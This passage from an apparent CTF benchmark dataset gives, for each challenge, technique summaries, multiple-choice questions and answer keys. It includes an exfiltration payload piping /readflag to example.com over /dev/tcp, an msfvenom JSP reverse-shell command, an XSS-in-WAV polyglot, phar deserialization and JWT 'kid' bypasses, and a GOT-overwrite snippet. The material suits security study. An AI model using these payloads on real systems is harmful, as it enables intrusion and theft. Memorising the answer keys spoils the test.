            "In a scenario where you have to crack an LCG (Linear Congruential Generator) to solve a cybersecurity challenge, assuming the modulus \\(p\\) and the seed are known, but the multiplier \\(a\\) and increment \\(c\\) are unknown, which of the following approaches correctly describes how to recover \\(a\\) and \\(c\\) using three generated numbers \\(X_1, X_2, X_3\\)? - A. Use \\(a \\equiv (X_2 + X_1) \\cdot X_3 \\mod p\\) and \\(c \\equiv X_1 \\cdot X_2 + X_3 \\mod p\\) - B. Use \\(a \\equiv \\frac{X_3 - X_2}{X_2 - X_1} \\mod m\\) and \\(c \\equiv X_2 - aX_1 \\mod m\\) - C. Use \\(a \\equiv X_2 \\cdot X_1 + X_3 \\mod p\\) and \\(c \\equiv \\frac{X_1 + X_3}{X_2} \\mod p\\) - D. Recover \\(a\\) using \\(a = X_2 / X_1 \\mod p\\) and then find \\(c\\) by \\(c = X_3 - X_2 \\mod p\\)",
            "In the context of an LCG challenge where you can't directly access generated random values but need to indirectly deduce these values through application logic or output manipulation, which sequence of operations could allow you to isolate and leak the LCG's multiplier parameter \\(a\\)? - A. Add \\(X_2\\) to bowl 1, subtract \\(X_3\\) from bowl 2, then multiply bowls 1 and 2 - B. Divide \\(X_1\\) by \\(X_2\\) in bowl 1, then subtract \\(X_3\\) from bowl 1 - C. Add \\(X_2\\) to bowl 1, add \\(X_3\\) to bowl 2, subtract bowl 2 from bowl 1, add \\(X_1\\) to bowl 2, add \\(X_2\\) to bowl 3, subtract bowl 3 from bowl 2, divide bowl 1 by bowl 2 - D. Multiply \\(X_1\\) with \\(X_3\\) in bowl 1, add \\(X_2\\) to the result, then divide by \\(X_3\\) in bowl 2"
        ],
        "answer": [
            "B",
            "C"
        ]
    },
    {
        "name": "idIoT_ Camera",
        "write_up": "dataset/raw/idIoT_ Camera.md",
        "type": "web",
        "competition": [
            "PlaidCTF/2018",
            "https://ctftime.org/event/617/tasks/"
        ],
        "score": -1.0,
        "max_score": 800,
        "difficulty": -1,
        "knowledge": [
            "When a website's Content Security Policy (CSP) does not define restrictions for certain resource types (like `image-src` or lacking specification for `script-src`), an attacker can exploit these omissions for cross-site scripting (XSS) attacks. For `script-src` specifically, if only 'self' is specified without allowing inline javascript, an attacker can bypass this limitation by uploading a file with a JavaScript payload embedded within a legitimate file type (like audio files), and then referencing this uploaded file in a script tag to execute the payload. This technique, however, requires finding a file type and file extension that will not be served with a content type that prevents script execution in modern browsers. An example manipulation involves modifying a WAV file header to comment it out and inserting JavaScript payload afterwards, ensuring the file extension is one that the server does not recognize as an audio file, to allow for script execution in browsers.\n   \n   Example Payload in WAV File:\n\n   ```\n   00000000: 5249 4646 3d31 2f2a 5741 5645 666d 7420  RIFF=1/*WAVEfmt  \n   ...  \n   000000c0: 0000 0000 0000 0000 2a2f 0a3b 616c 6572  ........*/.;aler  \n   000000d0: 7428 3129 3b0a                           t(1);.  \n   ```",
            "Protocol smuggling or Server Name Indication (SNI) field manipulation in HTTPS requests can be used for bypassing input validation mechanisms of a server. This technique involves exploiting the fact that certain protocols, including FTP and HTTPS, may interpret payload differently, where HTTPS's Client Hello message contains an unencrypted SNI field. This field can be crafted to contain commands interpretable by another protocol, intending to smuggle commands to a server expecting a different protocol. This is especially useful when bypassing web application firewalls (WAFs) or directing payloads to unintended services within the target infrastructure. The strategy necessitates crafting an SNI field to contain the smuggled command, which leads to protocol-specific actions being taken by the server, potentially leading to unauthorized actions or information disclosure. \n\n   Example Manipulation (Not directly applicable as a payload but illustrates the concept):\n\n   ```\n   https://p8.8.8.8.aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa.aaaaaaaaaaaaaaa.127.0.0.1.xip.io:1212\n   ```\n\n   This utilizes the DNS naming (via services like xip.io) to smuggle FTP commands or other protocol-specific data through the SNI field of an HTTPS client hello message."
        ],
        "question": [
            "In a scenario where a web application's Content Security Policy only specifies 'self' for `script-src` and does not restrict `image-src`, what method can be used to perform a Cross-Site Scripting (XSS) attack with a JavaScript payload? - A. Directly embed the JavaScript payload in an HTML comment. - B. Insert the JavaScript code directly into the webpage's URL. - C. Upload a modified audio file with the JavaScript payload embedded after a commented-out header, using an extension not recognized as an audio file by the webserver. - D. Encode the JavaScript payload in Base64 and include it in the `src` attribute of an `img` tag. ",
            "When bypassing input validation mechanisms using protocol smuggling, which of the following describes a method to smuggle FTP commands to a server through the HTTPS protocol using the Server Name Indication (SNI) field? - A. Appending FTP commands as query parameters in an HTTPS URL. - B. Embedding FTP commands in the path of an HTTPS request. - C. Using the SNI field of an HTTPS request to contain FTP commands, crafted via DNS naming to direct payloads to unintended services. - D. Sending FTP commands in the `Authorization` header of an HTTPS request. "
        ],
        "answer": [
            "C",
            "C"
        ]
    },
    {
        "name": "idoriot",
        "write_up": "dataset/raw/idoriot.md",
        "type": "crypto",
        "competition": [
            "ImaginaryCTF/2023",
            "https://ctftime.org/event/2015/tasks/"
        ],
        "score": 100,
        "max_score": 490,
        "difficulty": 0.20408163265306123,
        "knowledge": [
            "When dealing with an IDOR vulnerability, especially on a web platform without available source code, investigating the process of user interactions such as registration or login can reveal manipulation points. This is particularly useful when user identification values are exposed or hinted within the UI or response messages. In specific situations where numeric user IDs are allocated sequentially or exposed to users, altering these IDs in requests (e.g., through form data or URL parameters) could grant access to unauthorized content or functionalities. This technique is effective in environments where backend validation of user actions based on IDs is lax or assumes trust in client-side controls.",
            "Tools like Burp Suite's Repeater function can be instrumental in testing for IDOR vulnerabilities by manually altering request parameters to test how the system responds to unexpected or unauthorized input values. For instance, changing a user ID in the request body to target admin accounts or other users\u2019 data can lead to privilege escalation or unauthorized data access if the application does not properly verify the user's permissions based on the session context. This approach is particularly useful when testing security in environments where direct object references are made through client-facing data. Example payload in a POST request could look like: `username=test&password=test&user_id=0`."
        ],
        "question": [
            "When investigating a web application for IDOR vulnerabilities without access to its source code, which of the following approaches is least likely to unveil potential manipulation points for accessing unauthorized content?  - A. Observing and modifying the numeric user IDs exposed in the UI or response messages during normal user interactions such as login or registration. - B. Sequentially altering exposed numeric user IDs within request parameters to explore unauthorized access to other users' data. - C. Inspecting HTTP cookies and session tokens for user identification values that might be manipulated to impersonate other users. - D. Relying solely on automated vulnerability scanning tools without manual testing to find IDOR vulnerabilities. ",
            "In the context of testing for IDOR vulnerabilities using tools like Burp Suite, which action best demonstrates the manual testing approach to exploit these vulnerabilities?  - A. Automatically scanning all endpoints with predefined payloads to identify potential IDOR vulnerabilities without analyzing the response. - B. Manually altering HTTP request parameters, such as changing a user ID to `0` in a registration request, to assess if the application improperly grants admin access or exposes sensitive data. - C. Using only the default settings in Burp Suite to passively monitor traffic without actively manipulating request parameters. - D. Sending randomized input values in all request fields to generate unexpected behavior without a targeted approach based on understanding of the application's logic. "
        ],
        "answer": [
            "D",
            "B"
        ]
    },
    {
        "name": "image uploader",
        "write_up": "dataset/raw/image uploader.md",
        "type": "web",
        "competition": [
            "3kCTF/2020",
            "https://ctftime.org/event/1077/tasks/"
        ],
        "score": 498,
        "max_score": 500,
        "difficulty": 0.996,
        "knowledge": [
            "To bypass restrictions on file wrappers and trigger deserialization attacks in PHP, you can utilize existing allowed wrappers in combination with vulnerable file handling functions. This approach is especially useful when direct usage of a targeted wrapper like `phar://` is blocked by input validation (e.g., using `preg_match()` to exclude certain schemes). By prepending an allowed wrapper and applying it to read from a restricted one, deserialization can be initiated indirectly. This technique leverages the `php://filter` stream wrapper to bypass restrictions and execute arbitrary code through deserialization, by pointing the resource to a `phar://` URL.\n   - Example payload: `php://filter/resource=phar://phar.jpeg`",
            "PHP object injection (POI) vulnerabilities can be exploited through specially crafted PHAR files to achieve remote code execution (RCE). This is viable when an application unsafely deserializes user-supplied content. By crafting a PHAR file that includes a bogus image header followed by PHP object serialization payload, attackers can leverage file upload features to execute arbitrary code. The PHAR file manipulates object's state and triggers methods such as `__destruct()` or `__wakeup()` with crafted properties to perform actions unintended by the application's logic, like writing arbitrary files or executing code. This attack vector is especially potent if the application's logic includes classes with methods that can be abused post-deserialization.\n   - Example scenario: Crafting a PHAR file masquerading as an image that, when deserialized, injects a malicious object into the application flow, resulting in the execution of arbitrary PHP code stored in the PHAR metadata. The PHAR stub can include PHP code execution payloads to be written into a file, which can be further executed via a web request."
        ],
        "question": [
            "In a PHP application, an input validation function is used to prevent the inclusion of the `phar://` wrapper in user-supplied paths. The function is as follows: ```php if (preg_match('/^(ftp|zlib|https?|data|glob|phar|ssh2|compress.bzip2|compress.zlib|rar|ogg|expect)(.|\\\\s)*|(.|\\\\s)*(file|data|\\.\\.)(.|\\\\s)*/i', $_GET['input'])) { die(\"no hack !\"); } ``` Which wrapper could be used to bypass this restriction and trigger deserialization attacks? - A. `data://` - B. `https://` - C. `php://filter` - D. `glob://`",
            "When exploiting a PHP Object Injection vulnerability through a specially crafted PHAR file, what kind of method can be abused post-deserialization to perform harmful actions or remote code execution in the context of an application that does not sanitize user-controlled deserialization processes properly? - A. The `__invoke()` method, which is automatically called when a script tries to call an object as a function. - B. The `__toString()` method, which is utilized when an object is treated as a string. - C. The `__destruct()` method, which is automatically called at the end of the script or when an object is no longer referenced. - D. The `__construct()` method, which is called upon the creation of an object."
        ],
        "answer": [
            "C",
            "C"
        ]
    },
    {
        "name": "imagehost",
        "write_up": "dataset/raw/imagehost.md",
        "type": "web",
        "competition": [
            "b01lers/2024",
            "https://ctftime.org/event/2250/tasks/"
        ],
        "score": -1,
        "max_score": 438,
        "difficulty": -1,
        "knowledge": [
            "When exploiting JSON Web Tokens (JWT) with RS256 algorithm, if the application allows the inclusion of external or user-supplied keys (as indicated by the \"kid\" header in the JWT), an attacker can host their public key, sign the token with their private key, and modify the JWT's \"kid\" header to point to the attacker's public key. This allows for the verification process to use the attacker's public key, thereby bypassing intended security checks and enabling privilege escalation or impersonation attacks if the application does not properly validate the source of the public key. Example of modified header to use attacker's public key:\n   ```\n   {\n     \"alg\": \"RS256\",\n     \"kid\": \"/path_to_attacker_public_key/attacker_public_key.pem\",\n     \"typ\": \"JWT\"\n   }\n   ```\n   Example of a payload granting admin privileges:\n   ```\n   {\n     \"user_id\": 1,\n     \"admin\": true\n   }\n   ```",
            "In cases where server-side validation improperly trusts paths or URLs provided in JWT headers (e.g., the \"kid\" field), ensuring that the referenced files (in this case, the public key) are within a controlled or intended directory is essential. This scenario shows the importance of validating not just the token's signature but also the integrity and source of the keys involved in the signature verification process. The server's validation logic should include checking if the provided path is within expected bounds, and it must reject any external or untrusted sources for keys."
        ],
        "question": [
            "In the context of a JWT RS256 attack where an attacker modifies the JWT header to use their public key for verification, what is the primary goal of changing the \"kid\" value to the path of the attacker's public key? - A. To extend the JWT token's expiration time indefinitely - B. To bypass authentication by forcing the server to use an external signing key - C. To corrupt the JWT token so it cannot be read by the server - D. To trigger a denial of service attack by loading an invalid key",
            "When validating a JWT in a context where the \"kid\" header can point to an external or user-controlled path, what is the most critical security measure to prevent unauthorized access or privilege escalation? - A. Limiting the JWT's lifespan to a very short period - B. Requiring a complex, high-entropy JWT ID - C. Ensuring the key file referenced by the \"kid\" is within a trusted, predefined directory - D. Encrypting the payload of the JWT with a symmetric key"
        ],
        "answer": [
            "B",
            "C"
        ]
    },
    {
        "name": "Images and Words",
        "write_up": "dataset/raw/Images and Words.md",
        "type": "misc",
        "competition": [
            "Balsn/2019",
            "https://ctftime.org/event/811/tasks/"
        ],
        "score": 1000,
        "max_score": 1000,
        "difficulty": 1.0,
        "knowledge": [
            "When using Python web applications, an import ambiguity can occur if a user-uploaded directory or file shares the same name as an expected module. This can lead to remote code execution (RCE) by uploading a malicious `__init__.py` file in a directory named the same as the target module. Such a vulnerability can be exploited in applications where the filesystem can influence module imports. For instance, uploading `__init__.py` with a payload can cause the application to execute arbitrary code if it attempts to import a module of the same name as the uploaded directory.  \nExample payload:  \n```python  \n__import__('os').system('bash -c \"/readflag>/dev/tcp/example.com/80\"')  \n```",
            "Exploiting Regular Expression Denial of Service (ReDoS) vulnerabilities can induce service delays or disruptions, compelling server processes such as Gunicorn to restart workers due to timeouts. This behavior can be leveraged to execute previously unloaded or ignored malicious scripts by forcing the application to import or process them after restart. The use of such techniques is applicable in scenarios where server-side validation or processing uses poorly crafted regular expressions that are susceptible to catastrophic backtracking.  \nExample payload: A filename or input string like `aaaaaaaaaaaaaaaaaaaaaa!` designed to cause extensive backtracking in vulnerable regular expressions."
        ],
        "question": [
            "Considering the scenario in a Python web application where an import conflict can lead to remote code execution vulnerabilities, which of the following payloads uploaded as `__init__.py` in a user-controlled directory named `png` would effectively exploit this vulnerability to achieve code execution by bypassing the normal module import process? - A. `__import__('sys').exit(0)` - B. `__import__('os').system('ls')` - C. `__import__('os').system('bash -c \"/readflag>/dev/tcp/example.com/80\"')` - D. `print(\"Hello World\")` ",
            "When attempting to exploit a Regular Expression Denial of Service (ReDoS) vulnerability to induce a Gunicorn server process restart, which of the following input payloads represents an example that exploits catastrophic backtracking in regular expression processing? - A. `re.match(r'[.]+$', 'simple_string')` - B. `'simple_string'.replace('s', 'S')` - C. `aaaaaaaaaaaaaaaaaaaaaa!` - D. `'123'.isdigit()` "
        ],
        "answer": [
            "C",
            "C"
        ]
    },
    {
        "name": "Immutable",
        "write_up": "dataset/raw/Immutable.md",
        "type": "crypto",
        "competition": [
            "LakeCTF/2022",
            "https://ctftime.org/event/1728/tasks/"
        ],
        "score": 372,
        "max_score": 488,
        "difficulty": 0.7622950819672131,
        "knowledge": [
            "In blockchain-based CTF challenges, especially with Ethereum smart contracts, utilizing the `CREATE2` opcode allows for the deployment of a contract such that its address can be predetermined and is reusable. This is because the address generated by `CREATE2` is a function of the sender's address, a salt, and the bytecode of the contract being deployed. If a contract at that address is `SELFDESTRUCT`ed, it can be redeployed to the same address by using the same parameters (sender, salt, bytecode) with `CREATE2`. This technique is crucial for scenarios requiring the dynamic update of a contract's code or logic in a controlled manner.\n\n   Example steps:\n   - Deploy a Factory Contract.\n   - Use `CREATE2` from the factory with a specific salt to deploy the target contract, ensuring its address can be precomputed and is reusable after destruction.\n   - Perform operations or fulfill certain challenge conditions.\n   - `SELFDESTRUCT` the target contract.\n   - Redeploy to the same address using `CREATE2` with the same salt and potentially updated bytecode to meet new conditions or execute further steps.",
            "The combination of creating contracts with `CREATE`, which relies on the contract creation nonce, and self-destructing contracts using `SELFDESTRUCT`, can be used to reset the nonce and thus control the address of subsequent contracts created via `CREATE`. This strategy can be essential when the challenge involves controlling or predicting contract addresses or when needing to replace a contract's functionality while maintaining its address. This approach requires careful contract architecture and a deep understanding of the Ethereum Virtual Machine (EVM) creation and destruction mechanics.\n\n   Example steps:\n   - Deploy a control or factory contract.\n   - Use `CREATE` to deploy an initial contract, influencing the contract creation nonce.\n   - Perform operations or interact with the deployed contract as necessary.\n   - Self-destruct the deployed contract to reset the nonce.\n   - Deploy a new contract using `CREATE` with intended bytecode changes, thus having control over the address if the nonce reset and other conditions (e.g., transaction sender address) remain constant."
        ],
        "question": [
            "In the context of Ethereum smart contracts, which statement correctly describes how the `CREATE2` opcode can be utilized for deterministic contract deployment? - A. `CREATE2` uses the sender's address and a nonce to predictably compute the address of a new contract. - B. `CREATE2` allows for the deployment of a contract at a random address which cannot be predetermined. - C. `CREATE2` enables deterministic deployment of a contract by using the sender's address, a salt, and the contract's bytecode, allowing for the contract to be redeployed to the same address if it is self-destructed. - D. `CREATE2` generates a unique address for each deployment based solely on the contract's bytecode.",
            "In Ethereum contract development, how does the use of `SELFDESTRUCT` in conjunction with `CREATE` affect contract deployment? - A. `SELFDESTRUCT` and `CREATE` can be used together to generate random contract addresses for each deployment, enhancing the security of contract interactions. - B. Using `SELFDESTRUCT` followed by `CREATE` allows for the nonce of a contract to be reset, enabling control over the address of the next contract created. - C. `SELFDESTRUCT` directly increases the nonce used by `CREATE`, making the contract address unpredictable and enhancing privacy. - D. `SELFDESTRUCT` followed by `CREATE` permanently disables the ability to deploy contracts to the same address, increasing blockchain immutability."
        ],
        "answer": [
            "C.",
            "B."
        ]
    },
    {
        "name": "Important Service",
        "write_up": "dataset/raw/Important Service.md",
        "type": "pwn",
        "competition": [
            "P.W.N/2018",
            "https://ctftime.org/event/639/tasks/"
        ],
        "score": 259,
        "max_score": 792,
        "difficulty": 0.32702020202020204,
        "knowledge": [
            "When exploiting an out-of-bounds write vulnerability, attention should be paid to the calculation involving indices. Specifically, in scenarios where a program uses an incorrect bounds check on an index that controls the write to a buffer, it can be exploited to write data beyond the intended limit of the buffer. In such cases, carefully calculating the offset needed to reach important memory structures (like a return address, a canary, or certain libc addresses) is essential. Additionally, lacking null termination can be exploited to leak information. By filling buffers in such a way that there's no null byte between your payload and the target data, you can cause the program to leak data beyond the intended buffer.\n\n    - Example payload strategy:  \n    To overflow a buffer and overwrite specific memory addresses, use carefully crafted indices and data lengths to reach and modify the parts of the stack or memory that are of interest (e.g., to leak a canary or a libc address). For instance, if the goal is to overwrite a return address or a function pointer, calculate the exact distance in bytes from the controlled buffer to that target memory address and use the appropriate index and payload size to overwrite it.",
            "Where a program contains a vulnerability that allows writing arbitrary values to arbitrary addresses (like allowing negative indexing into an array which is located near important tables such as GOT), this can be exploited to redirect code flow. This technique can be particularly effective against programs containing functions that can be overwritten to redirect execution, such as the GOT table entries for libc functions. By overwriting these entries with addresses of gadgets or system functions, an attacker can gain arbitrary code execution.\n\n    - Example payload strategy:  \n    To leak libc addresses and overwrite GOT entries with one_gadget or system addresses, carefully calculate offsets from the controlled array to the GOT and use the vulnerability to first leak addresses, calculating the base address of libc or any other relevant section. Afterward, overwrite the GOT entries of functions (e.g., `exit` or `printf`) that are called later in the program execution with the address of `one_gadget` or `system(\"/bin/sh\")`.\n    - Example to rewrite the `exit` GOT entry:  \n    ```python\n    libc_addr = leak_qword(0x4018 - 0x4080) - e.symbols[\"printf\"]\n    shoot_qword(0x4030 - 0x4080, libc_addr + 0x4526a) # overwrite exit GOT entry\n    ```"
        ],
        "question": [
            "In a challenge exploiting an out-of-bounds vulnerability, given a stack-based buffer `char data[22][12];` and a function that incorrectly checks an index before writing to this buffer (`if (v2 <= 0xFC)` instead of verifying `(v2 * 12) <= 0xFC`), which technique best describes how to use this vulnerability to leak information, such as a stack canary or a libc address, without null termination? - A. Use the incorrect index check to overwrite the return address directly with a specific index. - B. Fill the buffer until there's no null byte between the payload and the target data to leverage the lack of null termination for leaking information. - C. Increment the index directly to the target data's memory address and write null bytes to terminate the data. - D. Use a negative index value to read memory addresses directly adjacent to the buffer.",
            "In a situation where a program vulnerability allows negative indexing into an array, which is exploited to overwrite Global Offset Table (GOT) entries, what strategy should be employed to achieve arbitrary code execution using the provided example code snippet (`libc_addr = leak_qword(0x4018 - 0x4080) - e.symbols[\"printf\"]` and `shoot_qword(0x4030 - 0x4080, libc_addr + 0x4526a)` to rewrite the `exit` GOT entry)? - A. Use the negative indexing to directly modify the stack's return address to the address of `system(\"/bin/sh\")`. - B. Calculate offsets to overwrite local variable values and change control flow within the current function. - C. Leak libc addresses through negative indexing, then rewrite GOT entries for critical functions to redirect code execution to gadgets or system commands. - D. Use negative indices to fill the buffer with NOPs and create a NOP sled leading to injected shellcode."
        ],
        "answer": [
            "B.",
            "C."
        ]
    },
    {
        "name": "In ctrl",
        "write_up": "dataset/raw/In ctrl.md",
        "type": "misc",
        "competition": [
            "DawgCTF/2020",
            "https://ctftime.org/event/1030/tasks/"
        ],
        "score": 200,
        "max_score": 500,
        "difficulty": 0.4,
        "knowledge": [
            "When dealing with systems vulnerable to unrestricted file upload leading to Remote Code Execution (RCE), it is effective to use crafted malicious `.war` files to gain shell access. This involves creating a `.war` file with a payload that spawns a reverse shell upon deployment and accessing it through the web application.",
            "In a situation where a specific file needs to be exfiltrated from a system with restricted access, converting the file to base64 format allows for easier copy-pasting and transfer through constrained interfaces (like web shells). This method circumvents issues that arise from binary data handling and transfer limitations."
        ],
        "question": [
            "In a cybersecurity challenge focusing on exploiting unrestricted file upload vulnerabilities, an attacker decides to deploy a reverse shell through a web application to gain unauthorized access. The attacker uses a specific tool to create a malicious `.war` file with the following command: ``` msfvenom -p java/jsp_shell_reverse_tcp LHOST=x.x.x.x LPORT=1337 -f war > m3ssap0.war ``` After uploading the `.war` file to the vulnerable application, which of the following actions is necessary to activate the reverse shell? - A. Opening the web application's homepage. - B. Navigating to the uploaded `.war` file through a direct URL. - C. Emailing the `.war` file to the system administrator for installation. - D. Renaming the `.war` file to a `.zip` extension to bypass security filters.",
            "In a scenario where an attacker aims to exfiltrate sensitive data from a compromised system with stringent output restrictions, they decide to convert the target binary file `webctrl_out.pcap` into a text format to bypass filters. This conversion facilitates the safe transfer of binary data out of the system as text. Which of the following commands would the attacker use for this purpose? - A. `tar -czvf webctrl_out.tar.gz webctrl_out.pcap` - B. `copy webctrl_out.pcap webctrl_out.txt` - C. `certutil -encode webctrl_out.pcap foo.txt` - D. `base64 webctrl_out.pcap > webctrl_out.b64`"
        ],
        "answer": [
            "B",
            "C"
        ]
    },
    {
        "name": "Indian guessing",
        "write_up": "dataset/raw/Indian guessing.md",
        "type": "crypto",
        "competition": [
            "MidnightSun/2020/Quals",
            "https://ctftime.org/event/935/tasks/"
        ],
        "score": 76,
        "max_score": 363,
        "difficulty": 0.209366391184573,
        "knowledge": [
            "When interacting with services parsing JSON in CTF challenges, particularly when dealing with unknown binaries engaging in parsing user input, it is insightful to experiment with different types of inputs such as numbers, strings, arrays, and dictionaries. This can reveal unexpected behavior or vulnerabilities, especially when specific values trigger unique responses. This strategy is useful for understanding how the service processes different input types and can lead to discovering avenues for exploitation or gaining deeper insights into the service's operation.\n\n   **Condition:** When facing a challenge involving a service that processes JSON input.\n   \n   **Knowledge Extracted:** Experimenting with diverse input formats (numbers, strings, arrays, dictionaries) can unveil unique behaviors in how the input is parsed and handled, leading to potential discovery of vulnerabilities or hints towards solving the challenge.",
            "In challenges involving custom encryption or hashing algorithms, especially when the \"hashing\" process involves well-known algorithms like MD5 and AES in unconventional ways, a viable strategy involves reverse engineering the process to reconstruct the key or plaintext from the hash. This can be achieved by creating a lookup table for all possible combinations of input values to the hashing function and then decrypting the hash by trying all possible key combinations until a match is found in the lookup table. This approach is potent when the algorithm uses a small, predictable portion of the key for each encryption step, making brute-forcing feasible.\n\n   **Condition:** When facing a challenge that involves decrypting or breaking a custom encryption or hashing mechanism, especially one that involves known encryption or hashing algorithms applied in a non-standard configuration.\n\n   **Knowledge Extracted:** Building a lookup table of all possible input value combinations to a hashing function and attempting decryption with all possible key combinations against this table can effectively reverse-engineer custom encryption or hashing algorithms to reveal keys or plaintext.\n\n   **Sample of Payload for Building Lookup Table:**\n\n   ```python\n   def buildTable():\n       table = {}\n       for data1 in range(256):  # 0x100 hex for 256 possible byte values\n           for data2 in range(256):\n               pair = chr(data1) + chr(data2)\n               hashed = hashlib.md5(pair.encode()).hexdigest()\n               table[hashed] = pair\n       return table\n   ```\n   \n   **Sample of Payload for Trying Keys:**\n\n   ```python\n   def tryKeys(table, encryptedData):\n       for key1 in range(256):\n           for key2 in range(256):\n               thisKey = (chr(key1) + chr(key2)) * 16  # Replicating key pattern from challenge\n               cipher = AES.new(thisKey.encode(), AES.MODE_ECB)\n               try:\n                   decryptedData = cipher.decrypt(bytes.fromhex(encryptedData))\n                   if decryptedData.hex() in table:\n                       return chr(key1) + chr(key2), table[decryptedData.hex()]\n               except:  # Catch decryption errors in case of incorrect key\n                   continue\n       return None, None\n   ```"
        ],
        "question": [
            "When attempting to understand service behavior in CTF challenges, which technique can reveal unexpected functionalities or vulnerabilities related to JSON input parsing? - A. Sending large dictionaries to overflow the parser. - B. Experimenting with various input types like numbers, strings, arrays, and dictionaries to observe different responses. - C. Inspecting the binary for hardcoded JSON strings that can be used as inputs. - D. Sending malformed JSON to crash the service.",
            "In a CTF challenge featuring a custom encryption algorithm that uses MD5 for hashing and AES for encryption in an iterative process with parts of a secret key, what approach can reverse-engineer the key from the hash? - A. Using a frequency analysis to guess the key based on the occurrence of hashed values. - B. Deploying a rainbow table attack to find precomputed hash collisions. - C. Building a lookup table of all possible input combinations for the hashing function and decrypting the hash by trying all possible key combinations until a match is found. - D. Leveraging differential cryptanalysis to uncover the key by analyzing changes between hash outputs."
        ],
        "answer": [
            "B.",
            "C."
        ]
    },
    {
        "name": "Infinity Gauntlet",
        "write_up": "dataset/raw/Infinity Gauntlet.md",
        "type": "reverse",
        "competition": [
            "angstrom/2021",
            "https://ctftime.org/event/1265/tasks/"
        ],
        "score": 75,
        "max_score": 300,
        "difficulty": 0.25,
        "knowledge": [
            "When dealing with challenges that require reversing functions and calculating specific outputs, using regular expressions to parse input and output formats enables efficient extraction of known and unknown values from challenges. This technique is universally applicable in automated exploitation scripts where the input and output format is predictable but contains variable values.\n\nExample Regular Expressions for parsing:\n- For a function `foo(a, b) = c`: `foo_regex = 'foo\\((\\d*|\\?), (\\d*|\\?)\\) = (\\d*|\\?)\\n'`\n- For a function `bar(a, b, c) = d`: `bar_regex = 'bar\\((\\d*|\\?), (\\d*|\\?), (\\d*|\\?)\\) = (\\d*|\\?)\\n'`",
            "In challenges where the output of functions is influenced by XOR operations, creating inverse functions based on the analysis can be used to compute missing variables. This approach is crucial when dealing with encrypted or obfuscated data that can be systematically reversed to reveal the original content. The concept of implementing reverse operations to decrypt or decode information is a fundamental technique in tackling reverse engineering and cryptographic CTF challenges.\n\n Example of inverse functions for `foo` and `bar` based on XOR and addition/subtraction operations:\n ```python\ndef foo1(b, c):\n   return c ^ 0x539 ^ (b + 1)\n\ndef bar1(b, c, d):\n   return -((c + 1) * b) + d\n```"
        ],
        "question": [
            "In a cybersecurity challenge where participants are required to reverse engineer and calculate specific outputs for a program's functions, how can regular expressions be utilized to parse given inputs and outputs efficiently?  Scenario: A challenge involves analyzing network traffic that includes requests to functions with known and unknown parameters. The requests follow a consistent format, `\"foo(a, b) = c\"` for one function and `\"bar(a, b, c) = d\"` for another. To automate the extraction of these parameters for further analysis, which of the following regular expressions correctly matches the given format for the `foo` function?  - A. `foo_regex = 'foo\\\\([0-9]*, [0-9]*\\\\) = [0-9]*'` - B. `foo_regex = 'foo\\([0-9]+, [0-9]+\\) = [0-9]+'` - C. `foo_regex = 'foo\\((\\d*|\\?), (\\d*|\\?)\\) = (\\d*|\\?)\\n'` - D. `foo_regex = '^foo\\(\\d+, \\d+\\) = \\d+$'` ",
            "In reverse engineering and cryptographic challenges, participants often encounter outputs that have been encrypted or obfuscated using mathematical operations like XOR. Given this scenario, how can creating inverse functions help in decrypting or decoding the information to compute missing variables?  Scenario: During a cybersecurity competition, a participant is analyzing a function that uses XOR operations to encrypt its output. The participant knows that a specific output `c` is obtained by XORing the input `b` with `0x539` and then adding `1` to the result. To calculate the original value of `b` given `c`, which of the following inverse function implementations is correct?  - A. `def calculate_b(c): return c - 1 ^ 0x539` - B. `def calculate_b(c): return (c ^ 0x539) - 1` - C. `def calculate_b(c): return c ^ 0x539 ^ (b + 1)` - D. `def calculate_b(c): return c + 1 ^ 0x539` "
        ],
        "answer": [
            "C",
            "B"
        ]
    },
    {
        "name": "Inorder",
        "write_up": "dataset/raw/Inorder.md",
        "type": "misc",
        "competition": [
            "Defcamp/2020",
            "https://ctftime.org/event/1182/tasks/"
        ],
        "score": 308,
        "max_score": 972,
        "difficulty": 0.3168724279835391,
        "knowledge": [
            "In challenges involving data structures such as binary trees, an imbalance in the tree can be exploited to create a side-channel timing attack. To exploit this, one can insert a large number of nodes with identical values to create a long linear branch, which significantly increases the time required for operations like search.",
            "For challenges that involve timing attacks to deduce information, using a script to automate sending inputs and measuring response times can identify when a condition changes (e.g., when finding a character in a flag). This can be more effective than binary search in unreliable network conditions, instead utilizing a linear search to observe the transition from quick to slow responses to infer the correct value.\n\nExample payload snippet for exploiting the binary tree imbalance:\n```python\npayload = \"/a \" + (';'.join(['exploit_value' for _ in range(2047)]))\n```"
        ],
        "question": [
            "When exploiting an imbalanced binary tree vulnerability to perform a timing attack, how should one structurally impact the binary tree to ensure the time complexity increases in a noticeable manner for search operations? - A. Insert nodes with incrementally increasing values to balance the tree evenly. - B. Insert a large number of nodes with identical values to create a long linear branch. - C. Insert nodes with decrementally decreasing values to form a balanced tree. - D. Randomly insert nodes without considering their values to create a complex tree structure. ",
            "In a scenario where network conditions are unreliable, which method can be more efficient for deducing information from a server-side processed flag through a timing attack? - A. Performing a binary search while sending a consistent number of payloads to identify the flag's characters. - B. Sending a single massive payload to instantly reveal the flag's characters based on the server's processing time. - C. Utilizing a linear search to observe the transitions from quick to slow responses for each character in the flag. - D. Avoiding any form of automated script and manually guessing the flag's characters to avoid triggering rate limiting or other defenses. "
        ],
        "answer": [
            "B",
            "C"
        ]
    },
    {
        "name": "Insanity check",
        "write_up": "dataset/raw/Insanity check.md",
        "type": "forensics",
        "competition": [
            "AmateursCTF/2023",
            "https://ctftime.org/event/1983/tasks/"
        ],
        "score": 470,
        "max_score": 500,
        "difficulty": 0.94,
        "knowledge": [
            "When encountering CTF challenges with a large block of text containing seemingly random words or phrases, closely examine them for patterns or anomalies. Such anomalies might hint towards hidden messages or clues. In the given scenario, the anomaly was the out-of-pattern phrase \"something hidden in the rules\", which was a direct clue to look for hidden information within a specific context (the rules).",
            "In challenges that suggest the presence of hidden messages or data within text or numeric sequences, consider the possibility of encoding or encryption. When provided with a series of numbers that do not immediately make sense within the context of the challenge (such as resembling Unix timestamps but not fitting the expected context), utilize online tools or algorithms to attempt decoding. In this instance, the numbers were successfully decoded using a specific tool and the RSA Decimal algorithm, revealing parts of the flag. This approach reinforces the importance of experimentation with various decoding techniques and tools."
        ],
        "question": [
